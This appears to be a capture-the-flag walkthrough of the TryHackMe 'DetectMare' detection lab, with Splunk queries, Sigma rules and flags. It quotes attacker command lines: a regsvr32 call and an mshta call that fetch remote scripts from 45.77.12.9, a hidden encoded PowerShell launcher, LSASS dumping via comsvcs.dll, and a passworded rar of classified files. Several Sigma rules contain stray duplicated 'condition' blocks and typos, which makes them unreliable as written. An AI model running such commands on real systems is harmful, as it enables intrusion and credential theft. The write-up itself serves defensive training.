# DetectMare

Room Link: [DetectMare](https://tryhackme.com/room/detectmare)

1. What is the doc file opened by the infected user?
*Answer*: Hypersonic_Test_Schedule_2025.docm
* Search within the Splunk instance for ```index="dac_lab" CommandLine="*certutil*"``` and find that the user executed the command by opening the file at ```3/11/25 8:42:10.000 AM```, on machine RESEARCH-ENG14 as user RESEARCH\m.okafor and process id 6112 with parent process id of 5476. The event can be found with ```index=dac_lab EventCode=1 User="RESEARCH\\m.okafor" Image="C:\\Windows\\System32\\cmd.exe"```. 

2. What is the PR#1 flag?
*Answer*: THM{OfFicE_LOL_bIN}
* This was solved using the help of [DetectMare Writeup](https://github.com/AnimSparrow/thm-writeups/blob/main/writeups/detectmare.md) since I was stuck.  

3. What is the filename of the internal tool that may cause false positives in PR#2 if not properly filtered?
*Answer*: researchdeploy.exe 
* From the environment information/background given in the challenge. 

4. What is the PR#2 flag?
*Answer*:
* Built the below sigma rule: 
```
title: Signed Binary Proxy Execution of NetTraveler Dropper
id: 3f9a2b10-1e44-4a2b-9b0a-1a2b3c4d5e07
status: experimental
description: Detects APT21 using signed Windows binaries to proxy execute the NetTraveler loader from a non-standard path.
author: jordan-blake
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\rundll32.exe'
    CommandLine|contains: '\ProgramData\'
  condition: selection
    Image|endswith: 
      - '\rundll32.exe'
      - '\regsvr32.exe'
    CommandLine|contains: 
      - 'C:\Users\*\AppData\Local\'
      - 'C:\Users\*\AppData\Roaming\'
      - 'C:\Users\*\AppData\LocalLow\'
      - 'C:\ProgramData'
  filter_parent:
    Image|endswith: 
      - '\rundll32.exe'
      - '\regsvr32.exe'
    CommandLine|contains: 
      - 'C:\Users\*\AppData\Local\'
      - 'C:\Users\*\AppData\Roaming\'
      - 'C:\Users\*\AppData\LocalLow\'
      - 'C:\ProgramData'
    ParentImage|contains: 'svchost.exe'
  filter_research:
    ParentImage|endswith: '\researchdeploy.exe'
    CommandLine|contains: 'C:\ProgramData\ResearchIT\pkg\'
    Image|endswith: 
      - '\rundll32.exe'
      - '\regsvr32.exe'
  filter_license:
    Image|endswith: '\regsvr32.exe'
    CommandLine|endswith: 'AppData\Local\Temp\LicenseCheck_CAD.dat'
  condition: selection and not filter_research and not filter_license and not filter_parent
```
* The above rule triggers on two events: 
	* On 11MAR2025 at 0906, user t.nguyen executed: ```CommandLine: regsvr32.exe /s /n /u /i:http://45.77.12.9/s.sct C:\ProgramData\scrobj.dll```. The parent command line is ```mshta.exe http://45.77.12.9/cfg.hta```. 
	* On 11MAR2025 at 0912, user p.alvarez executed: ```rundll32.exe C:\Users\p.alvarez\AppData\Local\Temp\nt7f.tmp,Entry```. The parent command line is ```powershell.exe -nop -w hidden -enc SQBFAFgA```. 
	
5. What is the username that the attacker used to execute the LSASS dump?
*Answer*: m.okafor
* Search for ```index="dac_lab" comsvcs.dll``` within Splunk. It returns with user m.okafor executing ```C:\Windows\System32\ntdll.dll+9d2e4|C:\Windows\System32\comsvcs.dll+1a3b0|UNKNOWN(00007FF8)``` in a Process accessed event/call trace at 1020 on 11MAR2025. 

6. What is the PR#3 flag?
*Answer*: THM{DuMpInG_LsAsS}
* Used the sigma rule below: 
```
title: LSASS Memory Access for Credential Theft
id: 3f9a2b10-1e44-4a2b-9b0a-1a2b3c4d5e09
status: experimental
description: Detects suspicious handle access to LSASS consistent with APT21 credential dumping.
author: jordan-blake
logsource:
  product: windows
  category: process_access
detection:
  selection:
    TargetImage|endswith: '\lsass.exe'
    CallTrace|contains:
      - 'comsvcs.dll'
      - 'dbghelp.dll'
      - 'dbgcore.dll'
      - 'UNKNOWN'
    GrantedAccess: 
      - '0x1fffff'
      - '0x1010'
      - '0x1038'
      - '0x1438'
      - '0x143a'
      - '0x1410'
      - '0x1400'
  filter_edr:
    SourceImage|startswith: 'C:\Program Files\ResearchEDR'
  filter_werfault:
    SourceImage|endswith: '\WerFault.exe'
  condition: selection
    GrantedAccess: '0x1410'
  filter_vault:
    SourceImage: 'C:\Program Files\ResearchPAM\vaultagent.exe'
    GrantedAccess: '0x1438'
  condition: selection and not filter_edr and not filter_werfault and not filter_vault
```

7. When did the pass-the-hash authentication happen?
Answer Format: The timestamp from the first line of the raw event in Splunk, in MM/DD/YYYY HH:MM:SS.mmm AM/PM. For example 06/22/2025 09:35:00.000 AM
*Answer*: 3/11/2025 10:40:00.000 AM
* Look for the authentication that occurs right after the initial compromise and focus on the key length of 0. Find with ```index="dac_lab" EventID=4624 ComputerName="FS-CLASSIFIED01.research.local" LogonType=3 AuthenticationPackageName=NTLM AccountName="m.okafor"```. 

8. What is the PR#4 flag?
*Answer*: THM{PaSs_ThE_HaSh}
* Use the sigma rule below: 
```
title: Pass the Hash Lateral Movement to Classified Host
id: 3f9a2b10-1e44-4a2b-9b0a-1a2b3c4d5e0a
status: experimental
description: Detects APT21 NTLM pass-the-hash logon followed by remote service creation.
author: jordan-blake
logsource:
  product: windows
  service: security
detection:
  selection_logon:
    EventID: 4624
    LogonType: 3
    KeyLength: 0
    AuthenticationPackageName: 'NTLM'
  selection_service:
    EventID: 7045
    EventType: 4
    ServiceFileName|contains:
      - 'cmd.exe'
      - '.dat'
      - 'powershell'
  filter_agent:
    ServiceFileName|contains: 
      - 'C:\Program Files\ResearchBackup'
      - 'C:\Program Files\ResearchIT\Patch'
  filter_legacy: 
    WorkstationName: 'MES-LEGACY01'
  filter_cluster:
    TargetUserName|contains: 'svc_cluster'
    ComputerName|contains: 
      - 'FS-CLASSIFIED02'
      - 'FS-CLASSIFIED01'
    WorkstationName|contains: 
      - 'FS-CLASSIFIED02'
      - 'FS-CLASSIFIED01'
  condition: (selection_logon and not filter_legacy and not filter_cluster) or (selection_service and not filter_agent)

```
9. In which folder should an attacker place a malicious binary to make it look like a legitimate backup routine?
*Answer*: D:\Backups\nightly
* Based on the environment documents provided. 
10. What is the PR#5 flag?
*Answer*: THM{ArChIvE_AnD_ExFiL}
* The true positive is an event with command line ```rar a -hpP@ssw0rd! C:\Users\Public\d.rar \\fs-classified01\designs\*.sldprt``` at 10:50 on 11MAR2025 by user m.okafor. 

```
title: Weapons Program Data Staged and Archived for Exfiltration
id: 3f9a2b10-1e44-4a2b-9b0a-1a2b3c4d5e0b
status: experimental
description: Detects APT21 compressing classified design documents into a password-protected archive prior to exfiltration.
author: jordan-blake
logsource:
  product: windows
  category: process_creation

detection:
  selection_designs:
    CommandLine|contains:
      - 'weapons'
      - 'designs'
  selection_zip:  
    CommandLine|contains:
      - 'a -mx=9'
      - 'a -mx9'
      - 'Compress-Archive -Path * -DestinationPath'
      - '.7z'
      - '.sldpart'
      - '.catport'
      - '.dwg'
      - '.zip'
      - '.rar'
  filter_backups:
    ParentImage: 
      - 'C:\Program Files\ResearchBackup\researchbackup.exe'
      - 'C:\Program Files\SOLIDWORKS\sldworks.exe'
  filter_sld:
    Image: 'C:\Program Files\SOLIDWORKS\sldworks.exe'
  condition: selection_designs and selection_zip and not filter_backups and not filter_sld
```


